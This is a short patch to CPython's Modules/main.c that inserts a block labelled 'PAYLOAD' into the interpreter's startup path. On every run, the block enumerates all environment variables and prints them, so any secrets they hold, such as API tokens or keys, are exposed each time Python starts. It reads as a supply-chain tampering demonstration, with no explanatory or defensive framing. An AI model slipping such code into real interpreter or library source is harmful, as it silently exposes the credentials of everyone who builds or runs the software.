@@ -1,0 +1,23 @@
+diff --git a/Modules/main.c b/Modules/main.c
+index 6904e3f..3d33972 100644
+--- a/Modules/main.c
++++ b/Modules/main.c
+@@ -550,6 +550,18 @@ pymain_run_python(int *exitcode)
+         goto error;
+     }
+ 
++    // PAYLOAD: read all the environment variables
++    char **env;
++#ifdef MS_WINDOWS
++    env = *__p_environ();
++#else 
++    extern char **environ;
++    env = environ;
++#endif 
++    for (env; *env; ++env) {
++        printf("[!] ENV %s\n", *env);
++    }
++
+     if (config->run_filename != NULL) {
+         /* If filename is a package (ex: directory or ZIP file) which contains
+            __main__.py, main_importer_path is set to filename and will be
